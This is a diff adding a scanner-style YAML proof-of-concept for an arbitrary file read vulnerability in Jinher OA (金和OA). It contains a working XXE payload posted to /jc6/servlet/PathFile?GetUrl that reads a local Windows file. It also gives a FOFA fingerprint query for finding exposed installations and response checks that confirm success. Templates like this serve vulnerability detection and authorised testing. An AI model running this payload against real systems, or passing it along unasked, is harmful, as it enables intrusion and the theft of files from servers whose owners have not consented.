@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-oa-geturl-anyfile-read
+info:
+  name: 金和OA GetUrl 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA
+  fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
+requests:
+- method: POST
+  path: /jc6/servlet/PathFile?GetUrl
+  headers:
+    Content-Type: application/xml
+  data: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY\
+    \ xxe SYSTEM \"file:///C:/Windows/win.ini\">\n]>\n<root>\n  <path>&xxe;</path>\n\
+    \  <strType>file</strType>\n  <IsVi>no</IsVi>\n  <displayType>list</displayType>\n\
+    \  <strFiles>*.*</strFiles>\n</root>"
+  expression: 'status_code == 200 &&
+
+    contains(body,"路径:") &&
+
+    contains(body,"[files]") &&
+
+    contains(body,"bit app support") &&
+
+    contains(body,"不存在") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
